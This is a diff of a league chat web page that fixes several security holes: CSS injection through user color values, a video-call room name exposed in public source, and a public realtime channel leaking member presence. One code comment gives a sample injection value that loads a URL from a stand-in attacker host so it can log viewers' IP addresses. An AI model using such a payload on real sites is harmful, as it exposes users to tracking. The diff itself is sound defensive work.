@@ -530,6 +530,13 @@
 
   /* ---------- rendering ---------- */
   function esc(s){ return String(s).replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];}); }
+  // Colors are interpolated into a style="color:…" attribute. esc() stops anyone
+  // breaking OUT of the attribute, but not from injecting extra CSS declarations
+  // inside it (`red;background:url(//evil.tld/x)` would beacon every viewer's IP
+  // to a third party). The RLS insert policy now rejects non-hex colors, and this
+  // is the matching client-side guard — it also covers the rows that were already
+  // in the table before that policy existed.
+  function safeColor(c){ return /^#[0-9a-fA-F]{6}$/.test(c||'') ? c : '#00007b'; }
   // Applied AFTER escaping, so this only ever wraps already-safe text in known tags —
   // never introduces user-controlled markup. **bold**, __underline__, _italic_.
   function formatText(escaped){
@@ -593,7 +600,7 @@
         var bodyHtml = isImageUrl(e.text)
           ? '<img class="gifMsg" src="'+esc(e.text.trim())+'" alt="GIF" loading="lazy">'
           : linkify(formatText(esc(e.text)));
-        d.innerHTML=tag+'<span class="sn" style="color:'+esc(e.color||'#00007b')+'">'+esc(e.name)+':</span> <span class="tx">'+bodyHtml+'</span>';
+        d.innerHTML=tag+'<span class="sn" style="color:'+safeColor(e.color)+'">'+esc(e.name)+':</span> <span class="tx">'+bodyHtml+'</span>';
       }
       log.appendChild(d);
     });
@@ -638,7 +645,7 @@
     rows.forEach(function(m){
       var r=document.createElement('div'); r.className='mrow';
       var c = m.uid && contactMap[m.uid] ? '<span style="font-size:10px;color:#666;">'+esc(contactMap[m.uid])+'</span>' : '';
-      r.innerHTML=runSVG+'<div style="display:flex;flex-direction:column;min-width:0;"><span style="color:'+esc(m.color)+';font-weight:bold">'+esc(m.name)+'</span>'+c+'</div>';
+      r.innerHTML=runSVG+'<div style="display:flex;flex-direction:column;min-width:0;"><span style="color:'+safeColor(m.color)+';font-weight:bold">'+esc(m.name)+'</span>'+c+'</div>';
       ml.appendChild(r);
     });
     $('memCount').textContent = rows.length;
@@ -844,8 +851,26 @@
   // the automatic broadcast. iframe src is only set while the modal is open so the
   // camera/mic release on close.
   (function videoCall(){
-    var VIDEO_ROOM = 'LatvianThumbs-' + ROOM + '-9f2k7Xz';
-    var VIDEO_URL = 'https://meet.jit.si/' + encodeURIComponent(VIDEO_ROOM);
+    // The Jitsi room name used to be hardcoded here. meet.jit.si rooms are open
+    // to anyone who knows the name, and this file is a PUBLIC GitHub repo — so
+    // the league's video call was joinable by anyone who read the source. That
+    // was the one place where "someone can listen in" was literally true.
+    //
+    // The slug now lives in public.ff_chat_settings, which only allowlisted
+    // members can SELECT, and it is random rather than guessable. Never inline
+    // it back into this file. To rotate it (e.g. someone leaves the league) see
+    // the update statement in security-hardening.sql §4.
+    var VIDEO_URL = null;
+    async function videoUrl(){
+      if(VIDEO_URL) return VIDEO_URL;
+      try{
+        var r = await supabase.from('ff_chat_settings').select('value').eq('key','video_room').maybeSingle();
+        if(r && !r.error && r.data && r.data.value){
+          VIDEO_URL = 'https://meet.jit.si/' + encodeURIComponent(r.data.value);
+        }
+      }catch(e){}
+      return VIDEO_URL;
+    }
     var modal=$('videoModal'), frame=$('videoFrame'), picker=$('videoPicker'), pickList=$('ringPickList');
     if(!modal||!frame) return;
 
@@ -868,21 +893,25 @@
       }).join('');
     }
     async function joinCall(){
+      var url = await videoUrl();
+      if(!url){ addHost('(video call unavailable — could not load the room)'); return; }
       modal.classList.add('open');
       picker.hidden = true;
-      frame.src = VIDEO_URL;
+      frame.src = url;
       try{
         await supabase.from('ff_chat_messages').insert({
           room:ROOM, user_id:me.uid, screen_name:me.name, color:me.color,
-          body: '🎥 Joined the video call — click to join: '+VIDEO_URL
+          body: '🎥 Joined the video call — click to join: '+url
         });
       }catch(e){ /* call still works locally even if the announcement fails */ }
     }
     async function ringSelected(names){
+      var url = await videoUrl();
+      if(!url) return;
       try{
         await supabase.from('ff_chat_messages').insert({
           room:ROOM, user_id:me.uid, screen_name:me.name, color:me.color,
-          body: '🔔 Pinging '+names.join(', ')+' to join the video call: '+VIDEO_URL
+          body: '🔔 Pinging '+names.join(', ')+' to join the video call: '+url
         });
       }catch(e){}
     }
@@ -1004,6 +1033,13 @@
   // own Gmail, free, no domain). Fire-and-forget — never blocks the UI, and quietly
   // no-ops until NOTIFY_URL is configured. The Apps Script enforces its own cooldown
   // per person so opening the tab repeatedly doesn't spam everyone's inbox.
+  // ⚠️ Read before wiring this up. NOTIFY_SECRET is not a secret — it ships in
+  // this file, in a public repo. It is only a "did this come from the app" hint,
+  // never an authorization check. If you paste a real NOTIFY_URL here, anyone can
+  // POST to that Apps Script with the same payload, so the script MUST rate-limit
+  // per recipient itself and must never accept a recipient list from the request
+  // body — otherwise it becomes an open relay that mails the whole league on
+  // demand. Currently inert: the PASTE_ placeholder makes notifyLogin() a no-op.
   var NOTIFY_URL = 'PASTE_YOUR_APPS_SCRIPT_WEB_APP_URL_HERE';
   var NOTIFY_SECRET = 'latvian-thumbs-9f2';
   function notifyLogin(){
@@ -1058,7 +1094,15 @@
       var rtSess = await getSession();
       if(rtSess && rtSess.access_token) await supabase.realtime.setAuth(rtSess.access_token);
     }catch(e){}
-    channel = supabase.channel('ff-room-'+ROOM, { config:{ presence:{ key: me.email } } });
+    // private:true is load-bearing. A PUBLIC realtime channel skips realtime
+    // authorization entirely, so anyone holding the publishable key could join
+    // topic "ff-room-league" and watch the presence roster — every member's
+    // screen name, color, user id, and who is typing — and announce fake members
+    // into everyone's window. Message CONTENT was never exposed (postgres_changes
+    // is filtered per-subscriber by RLS), but presence was. Private channels are
+    // gated by the ff_realtime_member_* policies on realtime.messages.
+    // Do not "simplify" this back to a public channel.
+    channel = supabase.channel('ff-room-'+ROOM, { config:{ private:true, presence:{ key: me.email } } });
     channel
       .on('postgres_changes',
         { event:'INSERT', schema:'public', table:'ff_chat_messages', filter:'room=eq.'+ROOM },
@@ -1098,7 +1142,11 @@
           $('status').textContent = 'Connected — '+(ROOM==='league'?'Latvian Thumbs':ROOM);
           channel.track({ name: me.name, color: me.color, uid: me.uid });
         } else if(st==='CHANNEL_ERROR' || st==='TIMED_OUT'){
-          $('status').textContent = 'Reconnecting…';
+          // Never silently fall back to a public channel to "fix" this — that
+          // would trade the presence leak back in without anyone noticing.
+          // History and sending both run over REST and keep working; only live
+          // updates degrade, so a refresh still shows everything.
+          $('status').textContent = 'Live updates offline — refresh to catch up.';
         }
       });
   }
@@ -1124,7 +1172,7 @@
     if(error){
       // Either the name is taken, or this account already locked in a name.
       var pr = await supabase.from('ff_chat_profiles').select('screen_name,color').eq('user_id', me.uid).maybeSingle();
-      if(pr && pr.data){ me.name = pr.data.screen_name; me.color = pr.data.color || me.color; enterRoom(); return; }
+      if(pr && pr.data){ me.name = pr.data.screen_name; me.color = safeColor(pr.data.color || me.color); enterRoom(); return; }
       btn.disabled = false;
       setNameMsg('That screen name is already taken — try another.');
       return;
@@ -1249,7 +1297,7 @@
       var pr = await supabase.from('ff_chat_profiles').select('screen_name,color').eq('user_id', me.uid).maybeSingle();
       if(pr && !pr.error) prof = pr.data;
     }catch(e){}
-    if(prof && prof.screen_name){ me.name = prof.screen_name; me.color = prof.color || me.color; enterRoom(); }
+    if(prof && prof.screen_name){ me.name = prof.screen_name; me.color = safeColor(prof.color || me.color); enterRoom(); }
     else { askName(); }
   })();
 </script>
